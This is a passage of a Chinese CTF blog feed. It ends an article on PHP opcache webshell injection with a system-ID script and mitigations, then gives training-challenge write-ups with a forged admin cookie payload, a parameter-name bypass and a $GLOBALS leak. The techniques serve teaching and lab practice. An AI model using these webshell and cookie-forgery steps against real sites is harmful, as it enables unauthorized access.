class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">__import__</span>(<span class="hljs-string">&#x27;hashlib&#x27;</span>).<span class="hljs-title function_ invoke__">md5</span>(data).<span class="hljs-title function_ invoke__">hexdigest</span>()<br><br><span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    <span class="hljs-keyword">print</span>(sys.argv[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot; [file|URL]&quot;</span>)<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">if</span> (sys.argv[<span class="hljs-number">1</span>].<span class="hljs-title function_ invoke__">startswith</span>(<span class="hljs-string">&quot;http&quot;</span>)):<br>    text = requests.<span class="hljs-title function_ invoke__">get</span>(sys.argv[<span class="hljs-number">1</span>]).text<br><span class="hljs-keyword">else</span>:<br>    with <span class="hljs-title function_ invoke__">open</span>(sys.argv[<span class="hljs-number">1</span>]) <span class="hljs-keyword">as</span> file:<br>        text = file.<span class="hljs-title function_ invoke__">read</span>()<br>        file.<span class="hljs-title function_ invoke__">close</span>()<br><br><span class="hljs-comment"># PHP Version</span><br>php_version = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;PHP Version &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;</span>, text)<br><br><span class="hljs-keyword">if</span> php_version == None:<br>    php_version = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;h1 class=&quot;p&quot;&gt;PHP Version (.*)&#x27;</span>, text)<br><br><span class="hljs-keyword">if</span> php_version == None:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;No PHP version found, is this a phpinfo file?&quot;</span>)<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br><br>php_version = php_version.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>)<br>php_greater_74 = (version.<span class="hljs-title function_ invoke__">parse</span>(<span class="hljs-string">&quot;7.4.0&quot;</span>) &lt; version.<span class="hljs-title function_ invoke__">parse</span>(php_version.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">0</span>]))<br><span class="hljs-comment"># Zend Extension Build ID</span><br>zend_extension_id = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Zend Extension Build &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;</span>, text)<br><span class="hljs-keyword">if</span> zend_extension_id == None:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;No Zend Extension Build found.&quot;</span>)<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br>zend_extension_id = zend_extension_id.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Architecture</span><br>architecture = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;System &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;</span>, text)<br><span class="hljs-keyword">if</span> architecture == None:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;No System info found.&quot;</span>)<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br>architecture = architecture.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_ invoke__">split</span>()[-<span class="hljs-number">1</span>]<br><br><span class="hljs-comment"># Zend Bin ID suffix</span><br><span class="hljs-keyword">if</span> architecture == <span class="hljs-string">&quot;x86_64&quot;</span>:<br>    bin_id_suffix = <span class="hljs-string">&quot;48888&quot;</span><br><span class="hljs-keyword">else</span>:<br>    bin_id_suffix = <span class="hljs-string">&quot;44444&quot;</span><br><br><span class="hljs-comment"># With PHP 7.4 they fixed the undefined macro that did the weird bin ID</span><br><span class="hljs-keyword">if</span> php_greater_74:<br>    zend_bin_id = <span class="hljs-string">&quot;BIN_&quot;</span> + bin_id_suffix<br><span class="hljs-keyword">else</span>:<br>    zend_bin_id = <span class="hljs-string">&quot;BIN_SIZEOF_CHAR&quot;</span> + bin_id_suffix<br><br><span class="hljs-comment"># Alternate Bin ID, see #5</span><br><span class="hljs-keyword">if</span> not php_greater_74:<br>    <span class="hljs-keyword">if</span> architecture == <span class="hljs-string">&quot;x86_64&quot;</span>:<br>        alt_bin_id_suffix = <span class="hljs-string">&quot;148888&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        alt_bin_id_suffix = <span class="hljs-string">&quot;144444&quot;</span><br><br>    alt_zend_bin_id = <span class="hljs-string">&quot;BIN_&quot;</span> + alt_bin_id_suffix<br><br><br><span class="hljs-comment"># Logging</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;PHP version : &quot;</span> + php_version)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Zend Extension ID : &quot;</span> + zend_extension_id)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Zend Bin ID : &quot;</span> + zend_bin_id)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Assuming &quot;</span> + architecture + <span class="hljs-string">&quot; architecture&quot;</span>)<br><br>digest = <span class="hljs-title function_ invoke__">md5</span>(php_version + zend_extension_id + zend_bin_id)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;------------&quot;</span>)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;System ID : &quot;</span> + digest)<br><br><span class="hljs-keyword">if</span> not php_greater_74:<br>    alt_digest = <span class="hljs-title function_ invoke__">md5</span>(php_version + zend_extension_id + alt_zend_bin_id)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;PHP lower than 7.4 detected, an alternate Bin ID is possible:&quot;</span>)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Alternate Zend Bin ID : &quot;</span> + alt_zend_bin_id)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Alternate System ID : &quot;</span> + alt_digest)<br></code></pre></td></tr></table></figure><p>得到<code>System ID : 0b8bd94e9858e5d32d058dc0acf75014</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php-opcache-include-2.png"></p><p>包含<code>flag.php.bin</code>即可</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php-opcache-include-3.png"></p><h1 id="二：opcache缓存-文件上传"><a href="#二：opcache缓存-文件上传" class="headerlink" title="二：opcache缓存+文件上传"></a>二：opcache缓存+文件上传</h1><p>靶机：<code>lewiserii/php7-opcache-upload</code>    &#x2F;&#x2F;关闭时间戳验证</p><p>首页是个文件上传点，可以自定义上传目录，简单测试后发现<code>/var/www/html</code>目录没有权限</p><p>同时给了个<code>phpinfo.php</code>，查看opcache状态，发现是启用状态，直接跑脚本算<code>system id</code></p><p>满足这几个条件就可以上传木马bin文件到缓存目录，覆盖后达到getshell的目的</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php7-include-upload-1.png"></p><p>得到缓存目录为<code>/tmp/opcache/0b8bd94e9858e5d32d058dc0acf75014/var/www/html</code></p><p>本地搭建一个opcache环境，写上一句话木马，把生成的<code>index.php.bin</code>拿下来</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php7-include-upload-2.png"></p><p>将图中红框部分的本地<code>system id</code>替换成靶机算出来的<code>system id</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php7-include-upload-3.png"></p><p>上传</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php7-include-upload-4.png"></p><p>再次访问<code>index.php</code>，发现内容已被覆盖</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php7-include-upload-5.png"></p><h1 id="三：修复方式"><a href="#三：修复方式" class="headerlink" title="三：修复方式"></a>三：修复方式</h1><h2 id="file-cache-only"><a href="#file-cache-only" class="headerlink" title="file_cache_only"></a>file_cache_only</h2><p>如果内存缓存方式的优先级高于文件缓存，那么重写后的 OPcache 文件（webshell）是不会被执行的。但是，当 Web 服务器重启后，就可以绕过此限制。因为，当服务器重启之后，内存中的缓存为空，此时，OPcache 会使用文件缓存的数据填充内存缓存的数据，这样，webshell 就可以被执行了。</p><h2 id="validate-timestamp"><a href="#validate-timestamp" class="headerlink" title="validate_timestamp"></a>validate_timestamp</h2><p>当<code>opcache.validate_timestamps=1</code>时，bin文件在创建时会在文件内容中写入一个时间戳，这个时间戳跟源文件一样，在执行bin文件之前php会检查时间戳是否一致，如果不一致则丢弃重新创建bin文件。</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php7-opcache-upload-6.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是opcache&quot;&gt;&lt;a href=&quot;#什么是opcache&quot; class=&quot;headerlink&quot; title=&quot;什么是opcache&quot;&gt;&lt;/a&gt;什么是opcache&lt;/h1&gt;&lt;p&gt;opencache是一种php7自带的缓存引擎，它将编译过一遍的的php脚本</summary>
      
    
    
    
    <category term="php" scheme="https://www.lewiserii.top/categories/php/"/>
    
    
    <category term="php" scheme="https://www.lewiserii.top/tags/php/"/>
    
    <category term="opcache" scheme="https://www.lewiserii.top/tags/opcache/"/>
    
  </entry>
  
  <entry>
    <title>【ctfshow】web入门-税务比武</title>
    <link href="https://www.lewiserii.top/ctfshow/web%E5%85%A5%E9%97%A8/%E3%80%90ctfshow%E3%80%91web%E5%85%A5%E9%97%A8-%E7%A8%8E%E5%8A%A1%E6%AF%94%E6%AD%A6.html"/>
    <id>https://www.lewiserii.top/ctfshow/web%E5%85%A5%E9%97%A8/%E3%80%90ctfshow%E3%80%91web%E5%85%A5%E9%97%A8-%E7%A8%8E%E5%8A%A1%E6%AF%94%E6%AD%A6.html</id>
    <published>2022-08-09T04:43:00.000Z</published>
    <updated>2022-08-09T09:07:06.795Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ea4063c5f8cc5cc15537c150a54d9958c4c407edf316ec72d87742de7a4e4c58">d53f41d2c7ee3b58c8999934d306edce22c71ecac700bd8e6517dad81c6abf70e72459f46326ae183ff28b6d524a0b6e27360baa67c19a28a84245843828581b7f9d2a69f45cab7172f5f6c6c9ce4edb0c986a2bbb1159f701e092f9ccdb1f72c2d02f3c3e18781141a567381583c3e20f1b4a7cacd939b839048919dd1402a51c11cf93663f20e1a315ad403a7516cba713eca1e1f714bec578ed504ebccf90755e1b684c2a0704343055b6110d33971432c6595b085a59f42523d0d5620f92dcb101a03cb7ce705286d7f0b69b4f1b11d55ccbb58cabd61aa12d69cee0ebb09c19213a249282e2adabfb1e395622837349208df5b7970aa0fd06f9331382694a17352139f544ef4d0e88fd92eb306360148b93b3ac157a34e6e680bf0d204c4a8bac5fabce6203c7ea88d60520966faf6579cad4d25bcb25cb7d80d2e15ff4a520b23ece852fb26538fd3848c854ced1725e3dbbf48b7c4fc91efff10e48b8a089e8a76cda47583e0d5be4f740b01c2d1c4abe473fd6f6e3bc76d337184464c1c22baa2e5492ac3172d9ed063cc8cfb8ee1b7a44536ab9e194ed144ba84da310ab4ede6a924522ab81f6c7b5fed1f87a08c2d118c8e071bc166ad30df27b7d0c300a5ffa6c49c94a7299d899029af1dba14058b5142c972ccf9852fda3b48f96ac09c465c384d8c58614c179b7fa364f676cf9b774dd57b807c4d1881471f6227ad4791ecb1b872c2c23744eb29b21fff676c6200837370cbc5cadd65c9890ad858b055c0a47d1fb6e46653db19e331d1d15b42930ad701f2582ae9a97187464cd728e4ffdf2facb5cff038065ab042405f1a8a591675ff2e6ce515f3fd5c77c810ad3545afd95aa1d016e996e09cbb4dfd42b38629fdb4bbac5ba37ab57b748d78a629ca9cca0cbb9baa788939861b9c137a1a175026f199265cb723554c9ca68cee980528747a074bde22ddc0b50300849c699fd246278a42c611b75d26e5acc39d7b04a1d995922969ab03ac4b165e0b4286d07957fcc63fac09a6eb5d3502df67b2563975d8df5d3f9fa34f6c3f8b14cbace81cf7e724efa516e9cf355b12ac8a9e86b0a83542216373c0c40f8e38e7e3132f1b732429bd0039899babd35f9b565bd91c2ec7927e2b20206d0a2de4e283fc34f0e724b82d0cb8223ea8262e13dd7cdb275a0d98916689f6cd9a7595ad5c0acb585ea501e57f831213c5f2b1b42dd23b320af2992749664286d542cdb577b33a1f6e25ad1a32d5185c411201d0f3e369ebe79ae51d6c8592579833ae373c9111cc6943e57ef0d0d4e09c89f1d3172da9684dd6774ac9c754b7122b1e19e7917a0d34b6b20a8d1e0fd39ead340bfc0c3d048dad6612f70edbcad836a7d93f5850b9029d3462f822b10d8b1f44ac2bf70c371d23cdf1ac71c5ccff5edfc07481bd61c0d9a27c3c8e8350a91d4b5fee1bcdcd4a964f9a4ae2daec51dfef494137f799a103baed9a40bc46e3dc82ec8179d5f147cc8924271e2e58aa38c4f063d25fc921c2c4fd2654acc69e611e006d237f9e3c2f89f2d2ccbbbef1162eb18bd292b5f5c94e5b7a168c6593c566f585facd6be5bcc924d96fecab780bb0292461419fd43c051bbd0b4b8eef0834bd1058c241982e67eaf72acd1d5509aa61cabd71809c8a33382d45254500888d946cbcfa632513859490643c691f76f4a816516bf675ff61fc1db4c9baf91877fcaf3c54cd9b79e61052d194c7508a298bd2588b189f3ad41ddf7cb45cb014ebcdb0e152d985017506b3c9e1be5fe573c61c2b375554fc34f14222c9cc8d890455e0ce6d5a385a02e1fbfff540b55a78877473c00b5211d02b685efa57a53f2c32501dc8d1413bbc617ae59d85a91cda042428e9fb9e20b25c200e7f035c75b31961c59209c427bd837e17099513321d1b6ff0ad3f057d730124bf1c08a9e7e964c64b1be5239ef16f4c028f7db16386928849549584df4573555627fbe34615484d6af338043f44b0840ca6345e2ec66e2562650e992a00cc8d94953dfc0fa456db288da311a1663a0961ed92bfc328c65a3db42948fc2a3ca7e40606fa1628fa18cef3f230cb3c6f7363ce3bd1464584bd79abd4642e6dfcf5415d8ef07f83eeea574560f379c08e4a11b9eca126520951f2fc9ae1402924045b2700e80cd2f70ee92ea390c5932647cde8c799a50a93419c63f2a134e5f5c8a83f702d3cf4b0208fd5854f74cc63ab4ce654000dbc0ec6278526af15d0ec3cd5ca3d23d321e815d83bbd0b967fb80aaad11c7a9026ca75cd0d9f78696be3acb03880c5a3448d4789f81a4ce7b87bc81081b10c00534675e52ecd5a9f00cabd6ffbaace17224ffce6e03ef80afa2549184fea3e3ca2b4e61265a0dc730dd2aaa50efd8abe45a3d9881e41e213c7f4cce3e091ed291ca420cbda1cf689823bfaec5791e83fabfa74e97e33ddb64b5a6c76ba63c813a02797494dbd0bf7f16485773a639d14a3528465eef90bdb232b40552fc0e366a88917bf5e703ad9e28c51c6435b2998c5530e8a32eaf93571091f3de6bb001d8ef9e4f9f283b9c72473d8bce884f6ae791af17fee2e721314a9e2a1a2deb696d079c25a41005d984b894c5f3f0fec2d720fafabc671d36e1bf824cc5b3f231546c5d34b8caad526be7ed66cc8826ca398565f5169c3a23d50383d82e2c71c49bd4f0ae90747f8aeab487e7830da0001520586432353341972cf9e2872848f0193c106dc7636ba9e49c1883cd169b7e0f88520555118210d0e46641285e9cc129620636a9537592bc7aabe2bc209ca5239547f73b58d13a983c9537adc50242286b57a8c94be0e42d2df064d887eb7bf9189bf44a6916b32409bb952aa06027732c27761b5acd3e9730aab25ec05f800065ed0e04803481f3ed81208011eb043bfd0452dedf0ee3837e3720f60d4374c3871df990a0ea70b70a031fc89759b663cfee19b48cdaf119c9a5fd5ec26606b938a00602356c893e670649be563d5ee8295ad236a3930bcbba88279697d80d3ad07d82a28773b514687da31e6266e300289e58294db04c782c874d6b34bd3c11e135124f5d81b8f5e6095f5f7c580cf4e5e6f9e8de6af40dff77490d015371c837df165030da0e19ecaeb0093b44670bdf4f4a8b0ea100967e8f5e4a5dedd9136d4ff71d0fbeafab0ca897acbca980fd6b50dfe16215419cd3bff97d459486accc3288831e35dce62b8af5965dad3b02a3d667995a91013461ca2c644e13d5bf5914c71ff49d4bf08b7027f0f70c15e891f158f010fc4b548dbcfc0bcc8f27917457cd5bb1d4c7f0b93551340a232d1a291afaf2126e86d34997faa12417e55d777cf84aff2baf4955ba2f6278086a8ff91b0d271efa102291988cfe5333264cf18dd1b352e813eeeaedc4eb5ecc26e02801f927dc62d7225c639f1ed537594a50a454a027005ffdfec0f6c4c610e06acd7c3135747fe1a14e8036568ce97a485d8e436d734260dcbdccdc17d15d2fa9c49bc17507a3d4602e96c57abbdfa1e7a33e2bad7f804c62f7e8b5d1553f1ec168978f9ac7530ba5ceb604d6df8be4ebaf42af50a13438b26f93d583b0a57a34d4db1deaada11aac3c46a54400df916995817985ec177db48b0f07c1b19815e3880d8e2214781843fbe0f765d429efddc6f48334643abe363f5fd83c483913821bdd32d144243813c317df3e93be06106bf46e4031e9c25d74d3bb57c2acf14acba2e3b0000fd2fcafdfccced8240ab5a90fa02e1dbaf9b56dd6e2d53ee925ed8d47fdea2d88e5e430fccb00f63a431399d6d3b1598753f63bacb20e14365ed92e18a075bad2a044ed58f511c7f58fe59b284aa81695bebaa0556dd01577a119a34c52a05729ccd7f4059960536c8a94e80bff6c60e0b062902769b14548fd16a7c64b22ae2c01f31455d6641cf73aa090689bd2092d719278a080075b1449eff2780c8bc846a4f5c44e25df2e1d8374a6b43d05a362b1df7ec9393e76b37434aede0d6bc7b1365bb4215891d57893b8d5274d0ba004d57664260bef44d0040bec979959db2bbdedc9d48dd9db104676908c72704bd3f92565a8abc8f0ca540748bee85decf5ebf216f3a331938ba11b72b1ab72cacfcf9629f5d87535bf5eb5fd9a24f1ffac64c062f7899b64589dfcf562ea18f240616385a2fc43eba9c3ad4a850483a4a2e56dc3e88451b13b734ad171715b0882b450c5a769502046baf7525d686e886ab292b47a6af784bafb0c19ea482bafa0ec700a60209a4941920cb293206aa2810a01d08478969fc75752d874693ca368fdcadfd0c5a43e12769e6cd6f4be07bf9ce53f81a682b6b6fff782fb5c437308a7b260c40c6b0a275b047c35c8ffb6740f9e8e38e604a38f44167315e3f5dfba8a31144c696c29bf7d44ccbdfeed2f4eac25f55e7963ea7241ccacfed38d191eafd8d2a4c715ded30c12e53048c72247a695102be0dfbe275236c63af71c0da9b03afd39074bf902234ec7409d915a5428805e258ee334688021e9d8772ea090d03dc72b493fe13c8345f106b26c01a422e988b55ffd9849740188eb913d570018bb723d135ffd5899486fbc1f260fef1d07740c5ac54a3e7cb01f5ab8454a7854a9fbb68efb3f0135ef23f6a7391acf7fd01205862b3741971b54796b0e2a6ed1aeac89680d7bdf093f5f961948e901933ab9061271add3ef14667a94b0cf12ab4b6c27ede8f60c53f84f93058f2ec9ddaa6f0e47962fb82c049ede24e71f7ce03d75ee9fdab2d595bc7a12a716715a8ac8d8badc7b00a67e0b56f301c3bb5ef98dc81b19a56f5fa53914deb49f0fa3cb13644f2d1e3d503ade5ebf24da2ad705a63fd2b449a4b396102644a50a71d6a6aae057399566f15206ea6d6fdcd5067642812787abe775862ff0cfe8dde3da12dc09bd360a2989626db716e64e3aec99d1450e95d14435cc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="ctfshow-web入门" scheme="https://www.lewiserii.top/categories/ctfshow-web%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="ctfshow" scheme="https://www.lewiserii.top/tags/ctfshow/"/>
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="web入门" scheme="https://www.lewiserii.top/tags/web%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>奇安信CTF基础培训题目wp</title>
    <link href="https://www.lewiserii.top/wp/%E5%A5%87%E5%AE%89%E4%BF%A1CTF%E5%9F%BA%E7%A1%80%E5%9F%B9%E8%AE%AD%E9%A2%98%E7%9B%AEwp.html"/>
    <id>https://www.lewiserii.top/wp/%E5%A5%87%E5%AE%89%E4%BF%A1CTF%E5%9F%BA%E7%A1%80%E5%9F%B9%E8%AE%AD%E9%A2%98%E7%9B%AEwp.html</id>
    <published>2022-07-19T12:00:00.000Z</published>
    <updated>2022-12-09T10:39:56.219Z</updated>
    
    <content type="html"><![CDATA[<p>第一次当ctf讲师^_^</p><p>7.12-7.19 week1<br>7.19-7.26 week2<br>7.26-8.02 week3</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Web-2-hack"><a href="#Web-2-hack" class="headerlink" title="Web-2-hack"></a>Web-2-hack</h2><p>使用<code>dirsearch</code>扫描后台，发现存在<code>shell.php</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-Web-2-hack-1.png"></p><p>使用burp等工具抓包爆破密码，得到密码<code>hack</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-Web-2-hack-2.png"></p><h2 id="web-3-web82"><a href="#web-3-web82" class="headerlink" title="web-3-web82"></a>web-3-web82</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_error&quot;</span>, <span class="hljs-literal">false</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;A_A&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;A_A&#x27;</span>]:<span class="hljs-string">&#x27;A_A&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>], <span class="hljs-string">&quot;A_A&quot;</span>) !==<span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;A_A,have fun&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$str</span>&lt;<span class="hljs-number">9999999999</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;A_A,too small&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">elseif</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$str</span>&gt;<span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;A_A,too big&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>需要我们传入<code>A_A</code>，但是又不能等于<code>A_A</code>，看似很矛盾，实际上利用了php的一个小特性</p><p>在php中，变量名中的<code>+</code> <code>%20</code> <code>.</code> <code>空格</code> <code>[</code>会被替换成下划线，所以当我们传入<code>A.A</code>或<code>A A</code>时，也会被当成<code>A_A</code></p><p>然后就是绕过数字，因为在php中会认为数组比数字大，所以传入<code>?A+A[]=</code>即可</p><h2 id="vipzone"><a href="#vipzone" class="headerlink" title="vipzone"></a>vipzone</h2><p>首页有个hint，<code>guest:guest 账户已经启用</code>，那就用guest账号登录看一下</p><p>发现有两个cookie比较可疑，因为有一个非常明显是base64加密后的值</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-vipzone-1.png"></p><p>base64解密后发现是明文的序列化对象</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-vipzone-2.png"></p><p>而第二个cookie: <code>check</code>恰恰用这串base64的md5值的base64值来校验</p><p>所以我们只需要修改序列化对象然后加密就可以绕过登录了</p><p>但是我们不知道admin的密码，这里可以尝试用布尔型代替密码，并赋值为1</p><p>修改后的值：<code>O:4:&quot;User&quot;:2:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;b:1;&#125;</code><br>base64加密：<code>Tzo0OiJVc2VyIjoyOntzOjQ6InVzZXIiO3M6NToiYWRtaW4iO3M6NDoicGFzcyI7YjoxO30=</code><br>md5加密：<code>6897f0060a84ecb0600e4167d2a748e4</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-vipzone-3.png"></p><h2 id="web-3-web54"><a href="#web-3-web54" class="headerlink" title="web-3-web54"></a>web-3-web54</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag1.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$args</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^\w+$/&quot;</span>,<span class="hljs-variable">$args</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;args error!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump($<span class="hljs-subst">$args</span>);&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>有一个正则匹配<code>/^\w+$/</code></p><div class="note note-info">            <p>两个&#x2F;&#x2F;表示开始和结束<br>^表示开始字符串<br>$表示结束字符串<br>\w表示包含[a-z，A-Z, _ , 0-9]<br>+表示一个或者多个\w</p>          </div><p>然后是一个<code>$$args</code>，也就是说我们传入的参数将会被当作一个变量名并打印它的变量值</p><p>传入php超全局变量<code>$GLOBALS</code>即可</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-web-3-web54-1.png"></p><h2 id="Web-4-littledropbox"><a href="#Web-4-littledropbox" class="headerlink" title="Web-4-littledropbox"></a>Web-4-littledropbox</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$uploadDir</span> = <span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    